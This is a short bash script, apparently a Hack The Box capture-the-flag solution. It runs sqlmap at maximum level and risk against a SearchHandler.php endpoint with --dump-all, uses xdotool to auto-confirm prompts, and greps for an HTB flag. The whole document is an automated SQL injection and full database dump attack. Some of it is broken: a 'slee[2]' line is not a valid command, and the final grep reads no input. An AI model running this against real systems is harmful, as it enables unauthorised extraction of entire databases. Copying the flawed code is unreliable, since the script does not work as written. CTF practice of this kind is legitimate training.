#!/bin/bash

read -p "Enter Target URL: " URL

if [ -z "$URL" ]; then
    echo "[-] Try again!!! , Enter: http://IP:PORT"
    exit 1
fi

sqlmap_command="sqlmap -u \"$URL/Controllers/Handlers/SearchHandler.php\" --level=5 --risk=3 --random-agent --dump-all --data=\"search=l\" --chunked"

echo "[+] Running SQLMap...."
echo "[+] Come back later"
echo ""
slee[2]

eval $sqlmap_command &

while pgrep -x "sqlmap" > /dev/null; do
    xdotool search --sync --onlyvisible --class "sqlmap" key "Return"
    sleep 1
done

grep -o 'HTB{[^}]*' | tee HTBFlag.txt

echo "Scan complete! Check HTBFlag.txt for any found flags."
